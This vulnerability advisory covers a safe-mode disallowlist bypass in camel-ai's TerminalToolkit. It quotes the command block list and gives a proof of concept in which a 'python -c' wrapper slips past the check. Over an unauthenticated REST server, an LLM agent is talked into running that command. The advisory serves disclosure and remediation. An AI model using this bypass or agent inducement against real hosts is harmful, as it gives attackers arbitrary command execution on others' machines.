# CAMEL TerminalToolkit safe-mode command disallowlist bypass allows unauthenticated arbitrary command execution (CWE-78, CVSS 10.0)

## Summary

An attacker who can influence a shell command string -- by calling the toolkit directly, or remotely through the unauthenticated ChatAgentOpenAPIServer REST API -- executes arbitrary commands on the host with the privileges of the CAMEL process. TerminalToolkit in camel-ai 0.2.91a5 runs every command with `subprocess.Popen(..., shell=True)` after screening it against an incomplete disallowlist: the default `safe_mode=True` inspection never blocks script interpreters such as `python` or `node`, and its shell-wrapper recursion only recognizes six POSIX shells, so a payload like `python -c "import os; os.system(...)"` passes every check.

## Details

`TerminalToolkit.shell_exec()` runs every command through `subprocess.Popen(command, ..., shell=True)` on the default local backend (`use_docker_backend=False` is the constructor default, terminal_toolkit.py:109; local-backend execution branch at :752-762). With the default `safe_mode=True` (terminal_toolkit.py:112), the only pre-execution screening is `check_command_safety()` plus `cd`/`pushd` path restrictions. That screening fails in two complementary ways:

1. **The disallowlist omits script interpreters.** `DANGEROUS_COMMANDS` (camel/toolkits/terminal_toolkit/utils.py:62-112) contains 41 system-administration commands. The interpreters most suited to running arbitrary code (`python`, `node`, `perl`, `ruby`) and the shells themselves (`bash`, `sh`) are not listed.

2. **The shell-wrapper recursion only covers six POSIX shells.** `_extract_shell_c_payloads()` (utils.py:146-173) recurses into `-c`/`--command` payloads only when the first token is in `_SHELL_COMMANDS = {'bash', 'sh', 'zsh', 'dash', 'ksh', 'ash'}` (utils.py:44). A `python -c` or `node -e` wrapper is therefore neither recursed into nor disallowlisted. `check_command_safety()` also strips quoted strings before matching (utils.py:201), so the payload inside the quotes is never examined at all.

```python
# camel/toolkits/terminal_toolkit/utils.py:44
_SHELL_COMMANDS = {'bash', 'sh', 'zsh', 'dash', 'ksh', 'ash'}

# camel/toolkits/terminal_toolkit/utils.py:62-112 -- 41 system-administration
# commands; no interpreter or shell is listed
DANGEROUS_COMMANDS: List[str] = [
    # System administration
    'sudo',
    'su',
    'reboot',
    'shutdown',
    'halt',
    'poweroff',
    'init',
    # File system manipulation
    'rm',
    'chown',
    'chgrp',
    'umount',
    'mount',
    # Disk operations
    'dd',
    'mkfs',
    'fdisk',
    'parted',
    'fsck',
    'mkswap',
    'swapon',
    'swapoff',
    # Process management
    'service',
    'systemctl',
    'systemd',
    # Network configuration
    'iptables',
    'ip6tables',
    'ifconfig',
    'route',
    'iptables-save',
    # Cron and scheduling
    'crontab',
    'at',
    'batch',
    # User management
    'useradd',
    'userdel',
    'usermod',
    'passwd',
    'chpasswd',
    'newgrp',
    # Kernel modules
    'modprobe',
    'rmmod',
    'insmod',
    'lsmod',
]

# camel/toolkits/terminal_toolkit/utils.py:216-219 -- the entire disallowlist
# check for non-whitelist mode; quoted strings were removed at :201
for cmd in DANGEROUS_COMMANDS:
    pattern = rf'(?:^|;|\||&&)\s*\b{re.escape(cmd)}\b'
    if re.search(pattern, clean_command, re.IGNORECASE):
        return False, f"Command '{cmd}' is blocked for safety."

# camel/toolkits/terminal_toolkit/terminal_toolkit.py:712-719 -- the default
# safe_mode gate; on pass the command is handed to the host shell
if self.safe_mode:
    is_safe, message = self._sanitize_command(command)
    if not is_safe:
        return (
            "Error: Command rejected by TerminalToolkit safe mode. "
            f"{message}"
        )
    command = message

# camel/toolkits/terminal_toolkit/terminal_toolkit.py:750-762 -- local
# backend execution
if not self.use_docker_backend:
    env_vars = self._get_env_vars()
    proc = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE,
        shell=True,
        text=True,
        cwd=self.working_dir,
        encoding="utf-8",
        env=env_vars,
    )
```

The vulnerable code is not confined to the audited pre-release: `camel/toolkits/terminal_toolkit/utils.py` is byte-identical (git blob `7ed75df38294c449acfc67be45a84565a4ca1cef`) in the latest stable PyPI release 0.2.90, in v0.2.91a5, and in the current master branch.

**Why this is a vulnerability:**

- *"safe_mode is a helper, not a security boundary."* The code contradicts this: it is enabled by default (terminal_toolkit.py:112), its docstring calls it a security check, and its rejection message advertises a safety decision ("Error: Command rejected by TerminalToolkit safe mode. ..."). A default safety control that any `python -c` wrapper silently defeats provides no meaningful boundary for the host shell access it mediates. The control's own purpose is bypass prevention, not a convenience blocklist: the comment above the wrapper recursion reads "Recursively inspect shell-wrapper payloads to prevent bypasses such as `bash -c "rm -rf /"` where the dangerous sub-command is quoted." (utils.py:193-194).
- *"An LLM must be persuaded, so this is prompt injection, not a vulnerability."* No LLM is involved in Part A below: calling `TerminalToolkit().shell_exec()` directly with a `python -c` command executes it on the host. In Part B the LLM is the intended caller of the tool (that is what the tool exists for); the defect is that the safety gate passes, which is independent of who composed the command. Part A isolates the control failure from LLM behavior; it is evidence of the bypass, not the attack scenario -- the impactful scenarios are (a) and (b) in the Impact section, where the command string originates outside the process.
- *"The operator chose to expose the server."* Part A needs no server at all. For Part B, ChatAgentOpenAPIServer is the library's own documented component (camel/services/agent_openapi_server.py:96), and it performs no authentication on any of its seven routes (agent_openapi_server.py:191-365), so the library itself defines this unauthenticated surface. Tool-level command-injection defects of the same shape are tracked upstream as vulnerabilities (CVE-2025-61492: command injection via a bypassable check in an MCP shell tool; CVE-2025-67511: command injection in an agent framework's SSH tool).

**Amplification through the unauthenticated OpenAPI server.** `ChatAgentOpenAPIServer` (agent_openapi_server.py:96) wraps ChatAgent instances behind a FastAPI app (`self.app = FastAPI(...)`, :134, with no auth middleware) and registers seven routes under `/v1/agents` (`/init`, `/step/{agent_id}`, `/astep/{agent_id}`, `/history/{agent_id}`, `/reset/{agent_id}`, `/delete/{agent_id}`, `/list_agent_ids`, agent_openapi_server.py:191-365). None of these route handlers declares any authentication dependency, so the app is open to every client that can reach the port the operator serves it on (for example `uvicorn server:app --host 0.0.0.0 --port 8000`). `/init` resolves each requested `tools_names` entry from the operator-configured tool registry (agent_openapi_server.py:221-229); when TerminalToolkit's tools are registered -- the toolkit's own `get_tools()` lists `shell_exec` first (terminal_toolkit.py:1468-1477), and the launcher below registers it explicitly -- an unauthenticated client can initialize an agent with `shell_exec` attached and induce it to issue the bypassing command. Registering a built-in toolkit's tools into the server's registry is the project's own documented usage pattern: the shipped example `examples/services/agent_openapi_server.py` builds exactly such a registry (`tool_registry = {"search_wiki": [wiki_tool]}`) and passes it to `ChatAgentOpenAPIServer`.

**Suggested remediation:**

1. For the local backend, replace the disallowlist with an allowlist by default, or execute commands in an isolated sandbox.
2. In safe mode, refuse interpreter invocations (`python`/`python3`/`node`/`perl`/`ruby`/...), or extend `_extract_shell_c_payloads()` to recurse into their `-c`/`-e` payloads.
3. Add authentication (API key or token middleware) to the ChatAgentOpenAPIServer routes.
4. Prefer argument-list execution with `shell=False` where feasible.

## Proof of Concept

Dynamically verified against v0.2.91a5 in August 2026 (Windows host, DeepSeek as the model backend, marker written under the OS temp directory, 8/8 automated assertions passing for Part B). Part A requires no LLM backend and no server. Commands use POSIX paths; on Windows substitute `%TEMP%\camel_poc_marker.txt`.

**Setup:** `pip install "camel-ai==0.2.91a5" "mcp<2" fastapi uvicorn`. Two dependency notes: a current `mcp` 2.x release removes `mcp.server.FastMCP`, which camel-ai 0.2.91a5's unbounded `mcp>=1.3.0` pin does not yet account for -- without the `<2` pin, every `camel.toolkits` import fails at startup (`mcp` 1.29.1 restores them); and `fastapi` is not a base dependency -- it ships only in camel-ai's optional extras (`web_tools`, and the aggregate `all`), while the ChatAgentOpenAPIServer module imports it directly (Part A needs only the first two packages).

**Part A -- direct toolkit call, no LLM (library-level bypass):**

```python
import os, tempfile
from camel.toolkits import TerminalToolkit

marker = os.path.join(tempfile.gettempdir(), "camel_poc_marker.txt").replace("\\", "/")
t = TerminalToolkit()  # safe_mode=True by default

# 1) safe mode is active and does reject disallowlisted commands:
print(t.shell_exec(id="poc", command="rm -rf " + marker))
# Error: Command rejected by TerminalToolkit safe mode. Command 'rm' is blocked for safety.

# 2) the same filesystem write hidden behind `python -c` passes inspection
#    and executes on the host (python3 on bare Debian/Ubuntu):
cmd = 'python -c "import os; os.system(\'echo POC_EXECUTED > {m}\')"'.format(m=marker)
print(t.shell_exec(id="poc", command=cmd))
print("marker content:", open(marker).read().strip())   # -> POC_EXECUTED
os.remove(marker)
```

**Part B -- unauthenticated remote trigger through ChatAgentOpenAPIServer (uses a model backend for the agent; no credentials on the attacker side):**

```python
# server.py -- operator-side launcher registering the toolkit's tools
from camel.services.agent_openapi_server import ChatAgentOpenAPIServer
from camel.toolkits import TerminalToolkit
from camel.toolkits.function_tool import FunctionTool

toolkit = TerminalToolkit()
server = ChatAgentOpenAPIServer(
    tool_registry={"shell_exec": [FunctionTool(toolkit.shell_exec)]},
)
app = server.app  # ASGI application for uvicorn
```

```bash
export DEEPSEEK_API_KEY="sk-poc-FAKE-REPLACE-ME"   # model backend for the agent
uvicorn server:app --host 0.0.0.0 --port 8000

# --- attacker side: no authentication anywhere ---
TARGET=http://127.0.0.1:8000

# 1) create an agent with shell_exec attached
curl -s -X POST "$TARGET/v1/agents/init" \
  -H 'Content-Type: application/json' \
  -d '{"agent_id":"demo_agent","model_platform":"deepseek","model_type":"deepseek-chat","tools_names":["shell_exec"],"system_message":"You are a system administrator assistant. Use the shell_exec tool to run commands when the user asks."}'
# -> {"agent_id":"demo_agent","message":"Agent initialized."}

# 2) induce the agent to issue the bypassing command (reply arrives under "msgs", ~5-15 s)
curl -s -X POST "$TARGET/v1/agents/step/demo_agent" \
  -H 'Content-Type: application/json' \
  -d '{"input_message":"I need to verify my python toolchain works on this machine. Use the shell_exec tool to run exactly this command: python -c \"import os; os.system(\u0027echo POC_EXECUTED > /tmp/camel_poc_marker.txt\u0027)\". Tell me once it is done."}'

# 3) the command executed on the host through shell=True:
cat /tmp/camel_poc_marker.txt   # -> POC_EXECUTED
```

(On Windows hosts, use `%TEMP%\camel_poc_marker.txt` as the marker path in the induced command; a `\tmp` redirect lands on the drive root there. If the temp path contains spaces -- for example a Windows user name with a space -- point `TMP`/`TEMP` at a space-free directory first: cmd.exe truncates an unquoted redirect target at the first space.)

## Impact

- **Type:** OS command injection (CWE-78). The failing control is an incomplete disallowlist (CWE-184). When reached through ChatAgentOpenAPIServer, the trigger requires no authentication (CWE-306).
- **Who is impacted:** (a) any application whose inputs can influence command strings passed to `TerminalToolkit.shell_exec()` (the tool's intended use, with `safe_mode` at its default); (b) any operator serving ChatAgentOpenAPIServer with `shell_exec` registered, against any unauthenticated network client.
- **Attacker capabilities:** arbitrary command execution with the privileges of the CAMEL process: read arbitrary files and secrets (API keys, SSH keys, environment variables), modify or destroy files, install persistence, move laterally into the host's network, and terminate processes.
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = 10.0 (Critical).
  - AV:N -- the reported vector is the remote route: an unauthenticated client of the served OpenAPI app (the direct-library route is local).
  - AC:L -- a single fixed command defeats the gate; verified repeatedly.
  - PR:N / UI:N -- no authentication on the server routes; no victim interaction. UI:N holds because the LLM is not a human victim and no human action is required; the attacker's own HTTP requests complete the chain.
  - S:C -- the command spawns a host-shell process outside the vulnerable component (the camel-ai package), with host-level consequences.
  - C:H / I:H / A:H -- arbitrary host read, write/execute, and process control.

**Scope note (alternate scoring).** If the scope is instead treated as Unchanged (impact confined to the CAMEL process context), the same vector with S:U (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) scores **9.8** (Critical). Both values were computed with the official FIRST CVSS v3.1 formula: ISS = 1-(1-0.56)^3 = 0.914816; Impact(S:C) = 7.52x(0.914816-0.029) - 3.25x(0.914816-0.02)^15 = 6.0477, Impact(S:U) = 6.42x0.914816 = 5.8731; Exploitability = 8.22x0.85x0.77x0.85x0.85 = 3.8870; Base(S:C) = round-up(min(1.08x(6.0477+3.8870), 10)) = 10.0; Base(S:U) = round-up(5.8731+3.8870) = 9.8.

## Affected products

| Field | Value |
|------|------|
| **Ecosystem** | `pip` |
| **Package name** | `camel-ai` |
| **Affected versions** | `<= 0.2.91a5` |
| **Patched versions** | `None` |

## Severity

| Field | Value |
|------|------|
| **Severity** | `Critical` |
| **Vector string** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Score** | `10.0` |

## Weaknesses

| # | CWE | Name | Rationale |
|:--:|------|------|------|
| 1 (primary) | CWE-78 | Improper Neutralization of Special Elements used in an OS Command | The command that passes the screening is handed to the host shell via `subprocess.Popen(..., shell=True)` (terminal_toolkit.py:752-762) |
| 2 | CWE-184 | Incomplete List of Disallowed Inputs | The `DANGEROUS_COMMANDS` disallowlist contains 41 system-administration commands and lists no script interpreter or shell (utils.py:62-112) |
| 3 | CWE-306 | Missing Authentication for Critical Function | None of the seven ChatAgentOpenAPIServer routes declares an authentication dependency or middleware (agent_openapi_server.py:191-365) |
